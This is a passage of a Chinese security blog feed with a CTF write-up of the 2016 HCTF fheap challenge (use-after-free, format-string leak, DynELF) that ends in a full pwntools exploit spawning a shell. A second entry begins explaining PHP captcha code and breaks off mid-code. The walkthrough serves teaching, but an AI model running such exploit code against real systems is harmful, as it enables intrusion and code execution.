class="hljs-number">3</span></a>; <span class="hljs-comment">//p1指针未被置空,虽然free了,但仍可使用.</span><br>    func_ptr </em>p2=(func_ptr<em>)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">4</span></em><span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>));<span class="hljs-comment">//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">“malloc addr: %p\n”</span>,p2);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">“malloc addr: %p\n”</span>,p1);<span class="hljs-comment">//p2与p1指针指向的内存为同一地址</span><br>    p2[<span class="hljs-number">3</span>]=evil_fuc; <span class="hljs-comment">//在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br>    p1<a href="span class=&quot;hljs-string&quot;&gt;&quot;/bin/sh&quot;&lt;/span"><span class="hljs-number">3</span></a>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>}</code></pre><br><p>运行效果 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623001441464?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>最后成功获取shell <br><br>具体的解释注释里面很清楚，详见注释<br><br><br></p><br><h1 id="0x03-2016hctf-fheap">0x03 2016HCTF fheap</h1><br><p>用了一天的时间调试程序，这里参考了FlappyPig与官方的详细题解，但是总觉的说的不够清楚，有些地方理所当然，作为小白根本看不懂。结合着自己的漏洞调试经验写出详细的分析过程，供大家参考。</p><br><h2 id="0x1-题目分析">0x1 题目分析</h2><br><p>整个题目做下来利用到了很多知识点，这里列举一下</p><br><ol><br><li>UAF 二次释放&amp; fastbin的特性</li><br><li>64位格式化字符串漏洞</li><br><li>无libc地址泄露，DynELF</li><br></ol><br><p>主要运用的就是以上三点，首先寻找UAF可执行任意函数漏洞，其次利用puts函数寻找基址，接着利用printf格式化字符串进行内存泄露，最后UAF执行system函数</p><br><h2 id="0x2-申请释放-代码">0x2 申请&amp;释放 代码</h2><br><p>在编写的时候注意，输入顺序，利用recvuntil控制输入流程</p><br><pre class="prettyprint"><code class=" hljs python">申请代码<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create</span><span class="hljs-params">(size,content)</span>:</span><br>    p.recvuntil(<span class="hljs-string">“quit”</span>)<br>    p.send(<span class="hljs-string">“create “</span>)<br>    p.recvuntil(<span class="hljs-string">“size:”</span>)<br>    p.send(str(size)+<span class="hljs-string">‘\n’</span>)<br>    p.recvuntil(<span class="hljs-string">‘str:’</span>)<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">‘\n’</span>)[:-<span class="hljs-number">1</span>]<br><br>释放代码<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span><span class="hljs-params">(idx)</span>:</span><br>    p.recvuntil(<span class="hljs-string">“quit”</span>)<br>    p.send(<span class="hljs-string">“delete “</span>)<br>    p.recvuntil(<span class="hljs-string">‘id:’</span>)<br>    p.send(str(idx)+<span class="hljs-string">‘\n’</span>)<br>    p.recvuntil(<span class="hljs-string">‘sure?:’</span>)<br>    p.send(<span class="hljs-string">‘yes ‘</span>+<span class="hljs-string">‘\n’</span>)</code></pre><br><h2 id="0x3-uaf漏洞查找">0x3 UAF漏洞查找</h2><br><blockquote><br><p>程序自己实现了一套管理字符串的体系，但是在释放的时候用指针是否为空来判断该索引代表地方是否存放有字符串，如果指针不空，表示可以释放。但是释放完后，没有将指针置空，因此导致<strong>可以二次释放，多次释放</strong>。</p><br></blockquote><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623012118487?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><p>最后在释放内存之后，在delete后并没有置空，存在double free</p><br><h2 id="0x4-利用uaf修改函数地址">0x4 利用UAF修改函数地址</h2><br><p>首先我们了解一下本题的uaf漏洞，这里利用图片的形式展示一下关系</p><br><h3 id="1fastbin特性">1.fastbin特性</h3><br><pre><code>fastbin维护的chunk分九个档次，大小从16字节到80字节，每8个字节一个档次。那我们要求的0x20（32）个字节，属于48字节的档次（因为每个chunk还要加上16字节的管理区），所以我们申请0x20空间后释放的chunk被归到fastbin[5]这个链表中了。<br></code></pre><br><h3 id="2内存分布">2.内存分布</h3><br><p><img alt="这里写图片描述" src="http://p6.qhimg.com/t01de9a0cdd0857a62e.png" title=""></p><br><p>利用gbd动态调试查看结构体内存 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623102226965?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""> <br><br>最后一个就是freeshort函数指针<br><br></p><br><blockquote><br><p>总思路：首先是利用uaf，利用堆块之间申请与释放的步骤，形成对free_func指针的覆盖。从而达到劫持程序流的目的。具体来说，先申请的是三个字符创小于0xf的堆块，并将其释放。此时fastbin中空堆块的单链表结构如下左图，紧接着再申请一个字符串长度为0x20的字符串，此时，申请出来的堆中的数据会如下右图，此时后面申请出来的堆块与之前申请出来的1号堆块为同一内存空间，这时候输入的数据就能覆盖到1号堆块中的free_func指针，指向我们需要执行的函数，随后再调用1号堆块的free_func函数，即实现了劫持函数流的目的。</p><br></blockquote><br><p><img alt="这里写图片描述" src="http://p9.qhimg.com/t015295ad0ff28884c4.png" title=""></p><br><h2 id="0x5-泄露基址">0x5 泄露基址</h2><br><p>我们要知道堆的释放是一个先入后出的队列，也就是说你第最后一个释放，那么就地一个用，就本体而言首先申请三个堆块 ，其实两个就可以</p><br><pre class="prettyprint"><code class=" hljs sql">    <span class="hljs-operator"><span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>,<span class="hljs-string">‘aa’</span>)<br>    <span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>,<span class="hljs-string">‘bb’</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)</span></code></pre><br><p>通过调用puts函数打印该函数的地址（一开始我不怎么理解），为什么是覆盖成2d为什么不是1a等其他puts函数的地址，自己调试一下就知道了。</p><br><pre class="prettyprint"><code class=" hljs haskell">    <span class="hljs-typedef"><span class="hljs-keyword">data</span>=’a’<em>0x10+’b’</em>0x8+’\x2d’#第一次覆盖，泄露出函数地址。</span><br>    create(<span class="hljs-number">0x20</span>,<span class="hljs-typedef"><span class="hljs-keyword">data</span>)#在这里连续创建两个堆块，从而使输入的<span class="hljs-keyword">data</span>与前面的块1公用一块内存。个堆块，从而使输入的<span class="hljs-keyword">data</span>与前面的块1公用一块内存。</span><br>    delete(<span class="hljs-number">1</span>)#这里劫持函数程序流function puts running<br>    p.recvuntil(‘b’<em><span class="hljs-number">0x8</span>)<br>    <span class="hljs-typedef"><span class="hljs-keyword">data</span>=p.recvuntil<span class="hljs-container">(‘1.’)</span>[:-2]</span><br>    print <span class="hljs-typedef"><span class="hljs-keyword">data</span></span><br>    <span class="hljs-keyword">if</span> len(<span class="hljs-typedef"><span class="hljs-keyword">data</span>)&gt;8:</span><br>        <span class="hljs-typedef"><span class="hljs-keyword">data</span>=<span class="hljs-keyword">data</span>[:8]</span><br>    <span class="hljs-typedef"><span class="hljs-keyword">data</span>=u64<span class="hljs-container">(<span class="hljs-title">data</span>.<span class="hljs-title">ljust</span>(8,’\<span class="hljs-title">x00’</span>)</span>)-0xA000000000000 #这里减掉的数可能不需要，自行调整</span><br>    print hex(<span class="hljs-typedef"><span class="hljs-keyword">data</span>)</span><br>    proc_base=<span class="hljs-typedef"><span class="hljs-keyword">data</span>-0xd2d</span><br>    print <span class="hljs-string">“proc base”</span>,hex(proc_base)</em></code></pre><br><p>找到了plt表的基地址，下面就是对于格式化字符串的利用</p><br><h2 id="6格式化字符串">6.格式化字符串</h2><br><p>我们想要知道system的地址，在没有libc的环境下，利用格式化字符串泄露内存地址从而得到system的加载地址</p><br><p>格式化字符串的洞，一开始不知道怎么发现的。但想了一下，格式化字符串的洞必须满足以下条件， <br><br>1. 用户的输入必须能打印 <br><br>2. 用户输入的字符串在printf函数栈的上方（先压栈）<br><br></p><br><p>就这两个条件我们很快可以分析出漏洞的点就在create &amp; delete 函数 <br><br>我们首先create字符串调用delete 此时freeshort地址变成了printf，可以控制打印 <br><br>但是我们的参数放在哪里呢？ <br><br>我们又发现当输入yes时yes字符串在堆栈的位置正好是printf的上方<br><br><br></p><br><p>下面找一下printf的偏移 <br><br><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170623110422476?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""><br></p><br><p>64位的格式化字符串 <a href="http://blog.csdn.net/qq_31481187/article/details/72510875" target="_blank" rel="external">参见我的另一篇博客</a> <br><br>找到偏移是9 <br><br>这时编写leak函数<br><br></p><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span><br>    delete_str(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">‘a%9$s’</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">‘#’</span>) + p64(printf_addr)<br>    create_str(<span class="hljs-number">0x20</span>,payload)<br>    sh.recvuntil(<span class="hljs-string">“quit”</span>)<br>    sh.send(<span class="hljs-string">“delete “</span>)<br>    sh.recvuntil(<span class="hljs-string">“id:”</span>)<br>    sh.send(str(<span class="hljs-number">1</span>)+<span class="hljs-string">‘\n’</span>)<br>    sh.recvuntil(<span class="hljs-string">“?:”</span>)<br>    sh.send(<span class="hljs-string">“yes.1111”</span>+p64(addr)+<span class="hljs-string">“\n”</span>)<br>    sh.recvuntil(<span class="hljs-string">‘a’</span>)<br>    data = sh.recvuntil(<span class="hljs-string">‘####’</span>)[:-<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">‘\x00’</span><br>    <span class="hljs-keyword">if</span> len(data) &lt;= <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">print</span> hex(u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">‘\x00’</span>)))<br>    <span class="hljs-keyword">return</span> data</code></pre><br><h2 id="0x7-泄露system地址并使用">0x7 泄露system地址并使用</h2><br><pre class="prettyprint"><code class=" hljs oxygene">     #<span class="hljs-keyword">step</span> <span class="hljs-number">5</span> leak system addr<br>    create_str(<span class="hljs-number">0</span>x20,payload)<br>    delete_str(<span class="hljs-number">1</span>)#this one can <span class="hljs-keyword">not</span> be ignore because DynELF use the delete_str() at <span class="hljs-keyword">begin</span><br>    d = DynELF(leak, base_addr, elf=ELF(<span class="hljs-string">‘./pwn-f’</span>))<br>    system_addr = d.lookup(<span class="hljs-string">‘system’</span>, <span class="hljs-string">‘libc’</span>)<br>    print <span class="hljs-string">‘system_addr:’</span>+hex(system_addr)<br><br>    #<span class="hljs-keyword">step</span> <span class="hljs-number">6</span> recover <span class="hljs-keyword">old</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">to</span> <span class="hljs-title">system</span> <span class="hljs-title">then</span> <span class="hljs-title">get</span> <span class="hljs-title">shell</span><br>    <span class="hljs-title">delete_str</span><span class="hljs-params">(0)</span><br>    <span class="hljs-title">create_str</span><span class="hljs-params">(0x20,<span class="hljs-string">‘/bin/bash;’</span>.ljust(0x18,<span class="hljs-string">‘#’</span>)</span>+<span class="hljs-title">p64</span><span class="hljs-params">(system_addr)</span>)#<span class="hljs-title">attention</span> /<span class="hljs-title">bin</span>/<span class="hljs-title">bash</span>;</span> i don`t <span class="hljs-keyword">not</span> why <span class="hljs-keyword">add</span> the <span class="hljs-string">‘;’</span><br>    delete_str(<span class="hljs-number">1</span>)<br>    sh.interactive()</code></pre><br><h2 id="0x8-完整代码">0x8 完整代码</h2><br><pre class="prettyprint"><code class=" hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> <br>sh = process(<span class="hljs-string">‘./pwn-f’</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_str</span><span class="hljs-params">(size,str1)</span>:</span><br>    sh.recvuntil(<span class="hljs-string">“quit”</span>)<br>    sh.send(<span class="hljs-string">“create “</span>)<br>    sh.recvuntil(<span class="hljs-string">“size:”</span>)<br>    sh.send(str(size)+<span class="hljs-string">‘\n’</span>)<br>    sh.recvuntil(<span class="hljs-string">“str:”</span>)<br>    sh.send(str1)<span class="hljs-comment">#here why can not i user ‘\n’</span><br>    <span class="hljs-comment"># print ‘|’,sh.recvuntil(‘\n’)[:-1],’|’</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete_str</span><span class="hljs-params">(idn)</span>:</span><br>    sh.recvuntil(<span class="hljs-string">“quit”</span>)<br>    sh.send(<span class="hljs-string">“delete “</span>)<br>    sh.recvuntil(<span class="hljs-string">“id:”</span>)<br>    sh.send(str(idn)+<span class="hljs-string">‘\n’</span>)<br>    sh.recvuntil(<span class="hljs-string">“?:”</span>)<br>    sh.send(<span class="hljs-string">“yes”</span>+<span class="hljs-string">“\n”</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak</span><span class="hljs-params">(addr)</span>:</span><br>    delete_str(<span class="hljs-number">0</span>)<br>    payload = <span class="hljs-string">‘a%9$s’</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">‘#’</span>) + p64(printf_addr)<br>    create_str(<span class="hljs-number">0x20</span>,payload)<br>    sh.recvuntil(<span class="hljs-string">“quit”</span>)<br>    sh.send(<span class="hljs-string">“delete “</span>)<br>    sh.recvuntil(<span class="hljs-string">“id:”</span>)<br>    sh.send(str(<span class="hljs-number">1</span>)+<span class="hljs-string">‘\n’</span>)<br>    sh.recvuntil(<span class="hljs-string">“?:”</span>)<br>    sh.send(<span class="hljs-string">“yes.1111”</span>+p64(addr)+<span class="hljs-string">“\n”</span>)<br>    sh.recvuntil(<span class="hljs-string">‘a’</span>)<br>    data = sh.recvuntil(<span class="hljs-string">‘####’</span>)[:-<span class="hljs-number">4</span>]<br>    <span class="hljs-keyword">if</span> len(data) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">‘\x00’</span><br>    <span class="hljs-keyword">if</span> len(data) &lt;= <span class="hljs-number">8</span>:<br>        <span class="hljs-keyword">print</span> hex(u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">‘\x00’</span>)))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span><span class="hljs-params">()</span>:</span><br>    <span class="hljs-keyword">global</span> printf_addr<span class="hljs-comment">#set global printf addr cus leak() use it </span><br>    <span class="hljs-comment">#step 1 create &amp; delete</span><br>    create_str(<span class="hljs-number">4</span>,<span class="hljs-string">‘aa’</span>)<br>    create_str(<span class="hljs-number">4</span>,<span class="hljs-string">‘aa’</span>)<br>    delete_str(<span class="hljs-number">1</span>)<br>    delete_str(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#step 2 recover old function addr</span><br>    pwn = ELF(<span class="hljs-string">‘./pwn-f’</span>)<br>    payload = <span class="hljs-string">“aaaaaaaa”</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">‘b’</span>)+<span class="hljs-string">‘\x2d’</span><span class="hljs-comment"># recover low bits,the reason why i choose \x2d is that the system flow decide by</span><br>    create_str(<span class="hljs-number">0x20</span>,payload)<br>    delete_str(<span class="hljs-number">1</span>)<br>    <span class="hljs-comment">#step 3 leak base addr</span><br>    sh.recvuntil(<span class="hljs-string">‘b’</span>*<span class="hljs-number">0x10</span>)<br>    data = sh.recvuntil(<span class="hljs-string">‘\n’</span>)[:-<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">if</span> len(data)&gt;<span class="hljs-number">8</span>:<br>        data=data[:<span class="hljs-number">8</span>]<br>    data = u64(data.ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">‘\x00’</span>))<span class="hljs-comment"># leaked puts address use it to calc base addr</span><br>    base_addr = data - <span class="hljs-number">0xd2d</span><br>    <span class="hljs-comment">#step 4 get printf func addr</span><br>    printf_offset = pwn.plt[<span class="hljs-string">‘printf’</span>]<br>    printf_addr = base_addr + printf_offset <span class="hljs-comment">#get real printf addr</span><br>    delete_str(<span class="hljs-number">0</span>)<br>    <span class="hljs-comment">#step 5 leak system addr</span><br>    create_str(<span class="hljs-number">0x20</span>,payload)<br>    delete_str(<span class="hljs-number">1</span>)<span class="hljs-comment">#this one can not be ignore because DynELF use the delete_str() at begin     </span><br>    d = DynELF(leak, base_addr, elf=ELF(<span class="hljs-string">‘./pwn-f’</span>))<br>    system_addr = d.lookup(<span class="hljs-string">‘system’</span>, <span class="hljs-string">‘libc’</span>)<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">‘system_addr:’</span>+hex(system_addr)<br><br>    <span class="hljs-comment">#step 6 recover old function to system then get shell</span><br>    delete_str(<span class="hljs-number">0</span>)<br>    create_str(<span class="hljs-number">0x20</span>,<span class="hljs-string">‘/bin/bash;’</span>.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">‘#’</span>)+p64(system_addr))<span class="hljs-comment">#attention /bin/bash; i don`t not why add the ‘;’</span><br>    delete_str(<span class="hljs-number">1</span>)<br>    sh.interactive()<br><span class="hljs-keyword">if</span> <strong>name</strong> == <span class="hljs-string">‘<strong>main</strong>‘</span>:<br>    <span class="hljs-keyword">print</span> <span class="hljs-number">1</span><br>    main()</code></pre></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为大作业的需求要调试一个浏览器的UAF漏洞，首先必须对UAF漏洞有个整体的了解，本篇文章主要讲解UAF造成的原因以及利用方法，这里结合2016年HCTF fheap&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://yoursite.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>验证码机制与实现</title>
    <link href="http://yoursite.com/2017/06/16/%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <id>http://yoursite.com/2017/06/16/验证码机制与实现/</id>
    <published>2017-06-16T11:59:00.000Z</published>
    <updated>2017-10-22T02:14:27.255Z</updated>
    
    <content type="html"><![CDATA[<p>时下图形验证码的应用已经非常广泛了，无论是在web应用还是客户端软件中。主要是用来防止字典攻击（或称暴力猜解）、机器注册等   本篇文章主要讲解验证码实现机制与安全策略突破<br><a id="more"></a></p><p><link rel="stylesheet" type="text/css" href="http://static.blog.csdn.net/css/csdn_blog_detail.min.css"></p><div class="markdown_views"><blockquote><br><p>时下图形验证码的应用已经非常广泛了，无论是在web应用还是客户端软件中。主要是用来防止字典攻击（或称暴力猜解）、机器注册等 <br><br>  本篇文章主要讲解验证码实现机制与安全策略突破<br></p><br></blockquote><br><h1 id="0x01-原理分析">0x01 原理分析</h1><br><p><img alt="这里写图片描述" src="http://img.blog.csdn.net/20170616194007059?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvcXFfMzE0ODExODc=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" title=""></p><br><blockquote><br><p>1.客户端发起一个请求； <br><br>  2.服务端响应并创建一个新的SessionID同时生成一个随机验证码； <br><br>  3.服务端将验证码和SessionID一并返回给客户端； <br><br>  4.客户端提交验证码连同SessionID给服务端； <br><br>  5.服务端验证验证码同时销毁当前Session中的验证码，返回给客户端结果。<br><br><br><br></p><br></blockquote><br><h1 id="0x02-代码实现">0x02 代码实现</h1><br><p>这里用了网上的一个例子 <br><br><code>login.html</code><br></p><br><pre class="prettyprint"><code class=" hljs xml"><span class="hljs-doctype">&lt;!DOCTYPE html PUBLIC “-//W3C//DTD XHTML 1.0 Transitional//EN” “<a href="http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt" target="_blank" rel="external">http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&amp;gt</a>;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">html</span> <span class="hljs-attribute">xmlns</span>=<span class="hljs-value">“<a href="http://www.w3.org/1999/xhtml" target="_blank" rel="external">http://www.w3.org/1999/xhtml</a>“</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">meta</span> <span class="hljs-attribute">http-equiv</span>=<span class="hljs-value">“Content-Type”</span> <span class="hljs-attribute">content</span>=<span class="hljs-value">“text/html; charset=utf-8”</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-title">title</span>&gt;</span>无标题文档<span class="hljs-tag">&lt;/<span class="hljs-title">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-title">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-title">form</span> <span class="hljs-attribute">method</span>=<span class="hljs-value">“post”</span> <span class="hljs-attribute">action</span>=<span class="hljs-value">“./check.php”</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span>验证码: <span class="hljs-tag">&lt;<span class="hljs-title">img</span> <span class="hljs-attribute">id</span>=<span class="hljs-value">“captcha_img”</span> <span class="hljs-attribute">border</span>=<span class="hljs-value">‘1’</span> <span class="hljs-attribute">src</span>=<span class="hljs-value">‘./image.php?r=echo rand(); ?&gt;’</span> <span class="hljs-attribute">style</span>=<span class="hljs-value">“width:100px; height:30px”</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-title">a</span>  <span class="hljs-attribute">onclick</span>=<span class="hljs-value">“document.getElementById(‘captcha_img’).src=’./image.php?r=’+Math.random()”</span>&gt;</span>换一个?<span class="hljs-tag">&lt;/<span class="hljs-title">a</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-title">P</span>&gt;</span>请输入验证码:<span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">“text”</span> <span class="hljs-attribute">name</span>=<span class="hljs-value">‘authcode’</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">‘’</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-title">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-title">input</span> <span class="hljs-attribute">type</span>=<span class="hljs-value">‘submit’</span> <span class="hljs-attribute">value</span>=<span class="hljs-value">‘提交’</span> <span class="hljs-attribute">style</span>=<span class="hljs-value">‘padding:6px 5px;’</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">form</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-title">html</span>&gt;</span></code></pre><br><p><code>check.php</code></p><br><pre class="prettyprint"><code class=" hljs django"><span class="xml"><span class="php"><span class="hljs-preprocessor">&lt;?php</span><br>  header(<span class="hljs-string">“Content-Type:text/html;charset=utf-8”</span>);      <span class="hljs-comment">//设置头部信息</span><br>  <span class="hljs-comment">//isset()检测变量是否设置</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">‘authcode’</span>])){<br>    session_start();<br>    <span class="hljs-comment">//strtolower()小写函数</span><br>    <span class="hljs-keyword">echo</span> var_dump(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘authcode’</span>]),var_dump(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘authcode’</span>]);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">‘authcode’</span>] === <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘authcode’</span>]){<br>      <span class="hljs-comment">//跳转页面</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;script language=\”javascript\”&gt;”</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“alert(‘yes!”</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">‘authcode’</span>].<span class="hljs-string">“‘);”</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“document.location=\”./login.html\””</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;/script&gt;”</span>;<br>    }<span class="hljs-keyword">else</span>{<br>      <span class="hljs-comment">//提示以及跳转页面</span><br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;script language=\”javascript\”&gt;”</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“alert(‘输入错误!”</span>.<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">‘authcode’</span>].<span class="hljs-string">“‘);”</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“document.location=\”./login.html\””</span>;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">“&lt;/script&gt;”</span>;<br>    }<br>    <span class="hljs-keyword">exit</span>();<br>   }<br>  <span class="hljs-preprocessor">?&gt;</span></span><br></span></code></pre><br><p><code>image.php</code></p><br><pre class="prettyprint"><code class=" hljs mel">&lt;?php<br>  <span class="hljs-comment">//11&gt;设置session,必须处于脚本最顶部</span><br>  session_start();<br>  <span class="hljs-variable">$image</span> = imagecreatetruecolor(<span class="hljs-number">100</span>, <span class="hljs-number">30</span>);    <span class="hljs-comment">//1&gt;设置验证码图片大小的函数</span><br>  <span class="hljs-comment">//5&gt;设置验证码颜色 imagecolorallocate(int im, int red, int green, int blue);</span><br>  <span class="hljs-variable">$bgcolor</span> = imagecolorallocate(<span class="hljs-variable">$image</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>); <span class="hljs-comment">//#ffffff</span><br>  <span class="hljs-comment">//6&gt;区域填充 int imagefill(int im, int x, int y, int col) (x,y) 所在的区域着色,col 表示欲涂上的颜色</span><br>  imagefill(<span class="hljs-variable">$image</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bgcolor</span>);<br>  <span class="hljs-comment">//10&gt;设置变量</span><br>  <span class="hljs-variable">$captcha_code</span> = <span class="hljs-string">“”</span>;<br><span class="hljs-comment">//7&gt;生成随机的字母和数字</span><br>  <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">4</span>;<span class="hljs-variable">$i</span>++){<br>    <span class="hljs-comment">//设置字体大小</span><br>    <span class="hljs-variable">$fontsize</span> = <span class="hljs-number">8</span>;<br>    <span class="hljs-comment">//设置字体颜色，随机颜色</span><br>    <span class="hljs-variable">$fontcolor</span> = imagecolorallocate(<span class="hljs-variable">$image</span>, <span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">120</span>),<span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">120</span>), <span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">120</span>));      <span class="hljs-comment">//0-120深颜色</span><br>    <span class="hljs-comment">//设置需要随机取的值,去掉容易出错的值如0和o</span><br>    <span class="hljs-variable">$data</span> =<span class="hljs-string">‘abcdefghigkmnpqrstuvwxy3456789’</span>;<br>    <span class="hljs-comment">//取出值，字符串截取方法  strlen获取字符串长度</span><br>    <span class="hljs-variable">$fontcontent</span> = substr(<span class="hljs-variable">$data</span>, <span class="hljs-keyword">rand</span>(<span class="hljs-number">0</span>,strlen(<span class="hljs-variable">$data</span>)),<span class="hljs-number">1</span>);<br>    <span class="hljs-comment">//10&gt;.=连续定义变量</span><br>    <span class="hljs-variable">$captcha_code</span> .= <span class="hljs-variable">$fontcontent</span>;<br>    <span class="hljs-comment">//设置坐标</span><br>    <span class="hljs-variable">$x</span> = (<span class="hljs-variable">$i</span><span class="hljs-variable">*100</span>/<span class="hljs-number">4</span>)+<span class="hljs-keyword">rand</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>);<br>    <span class="hljs-variable">$y</span> = <span class="hljs-keyword">rand</span>(<span class="hljs-number">5</span>,<span class="hljs-number">10</span>);<br>    imagestring(<span class="hljs-variable">$image</span>,<span class="hljs-variable">$fontsize</span>,<span class="hljs-variable">$x</span>,<span class="hljs-variable">$y</span>,<span class="hljs-variable">$fontcontent</span>,<span class="hljs-variable">$fontcolor</span>);<br>  }<br>  <span class="hljs-comment">//10&gt;存到session</span><br>  <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">‘authcode’</span>] = <span class="hljs-variable">$captcha_code</span>;<br>  <span class="hljs-comment">//8&gt;增加干扰元素，设置雪花点</span><br>  <span 